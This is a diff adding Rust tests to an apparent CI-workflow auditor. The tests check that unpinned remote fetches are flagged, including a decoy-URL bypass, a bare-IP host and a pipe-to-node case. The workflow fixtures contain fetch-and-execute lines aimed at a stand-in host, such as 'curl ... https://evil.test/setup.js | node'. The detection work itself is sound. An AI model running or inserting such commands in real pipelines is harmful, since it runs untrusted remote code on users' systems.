@@ -123,6 +123,93 @@ fn versioned_url_is_clean() {
 }
 
 #[test]
+fn audit_flags_dangerous_url_after_versioned_decoy() {
+    // A versioned decoy URL placed before the real unpinned fetch must not
+    // suppress the finding — every URL on the line is checked, not just the first.
+    let workflow = "\
+name: decoy
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -L https://cdn.example.com/v1.2.3/safe.txt https://evil.test/install.sh -o out
+";
+    let dir = common::repo_with_workflow("ci.yml", workflow);
+    let output = common::pinprick_cmd()
+        .arg("--json")
+        .arg("audit")
+        .arg(dir.path())
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    let findings = json["findings"].as_array().unwrap();
+    assert_eq!(findings.len(), 1, "decoy bypass not caught: {json}");
+    assert!(
+        findings[0]["pattern_matched"]
+            .as_str()
+            .unwrap()
+            .contains("evil.test")
+    );
+}
+
+#[test]
+fn audit_flags_bare_ip_fetch() {
+    // A bare-IP host must not be read as a "versioned" URL and whitelisted.
+    let workflow = "\
+name: ip
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -L https://10.0.0.1/install.sh -o out
+";
+    let dir = common::repo_with_workflow("ci.yml", workflow);
+    let output = common::pinprick_cmd()
+        .arg("--json")
+        .arg("audit")
+        .arg(dir.path())
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    let findings = json["findings"].as_array().unwrap();
+    assert_eq!(findings.len(), 1, "bare-IP fetch not flagged: {json}");
+}
+
+#[test]
+fn audit_flags_pipe_to_node() {
+    // `curl | node` executes fetched JS — it must be HIGH pipe-to-shell, not
+    // a checksum-downgradeable medium.
+    let workflow = "\
+name: pipe-node
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -fsSL https://evil.test/setup.js | node
+";
+    let dir = common::repo_with_workflow("ci.yml", workflow);
+    let output = common::pinprick_cmd()
+        .arg("--json")
+        .arg("audit")
+        .arg(dir.path())
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+    let json: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    let findings = json["findings"].as_array().unwrap();
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0]["severity"], "high");
+}
+
+#[test]
 fn data_format_exempt() {
     let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_DATA_FORMAT);
     let output = common::pinprick_cmd()
